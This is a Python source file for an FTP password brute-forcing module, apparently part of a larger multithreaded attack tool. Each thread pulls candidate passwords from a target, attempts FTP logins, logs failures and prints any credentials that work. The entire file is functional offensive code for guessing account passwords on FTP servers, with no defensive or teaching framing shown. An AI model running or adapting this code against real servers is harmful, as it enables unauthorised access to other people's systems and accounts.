import ftplib
from target import Target
from attacker import Attacker


class FTPAttacker(Attacker):
    """
    A class representing FTP-attacking thread
    """

    def __init__(self, target: Target):
        super().__init__(target)

    def try_connect(self):
        """
        Try to connect to the host using self.curr_password
        """
        try:
            ftpclient = ftplib.FTP()
            ftpclient.connect(self.target.host, self.target.port)
            ftpclient.login(self.target.login, self.curr_password)
            ftpclient.quit()
        # authentication failure
        except ftplib.error_perm:
            print("[%s] Failed attempt against %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, self.curr_password))
            self.tries += 1
            self.failed_conns = 0
            self.curr_password = None
        # failed to connect to the host
        except OSError:
            print("[%s] Connection error - %s" % (self.name, self.target.host))
            self.failed_conns += 1
        # failed to connect - other exception
        except Exception:
            print("[%s] Unknown exception while connecting to %s" %
                  (self.name, self.target.host))
            self.failed_conns += 1
        # no exceptions occured -> authentication successful
        else:
            FTPAttacker.notify_password_found(self.curr_password)
            print("[%s] Found credentials for %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, self.curr_password))
            self.tries += 1
            self.failed_conns = 0
            self.curr_password = None
        finally:
            ftpclient.close()

    def run(self):
        while FTPAttacker.finish is False:
            if self.curr_password is None:
                self.curr_password = self.target.get_password()
                if self.curr_password is None:
                    continue
            self.try_connect()
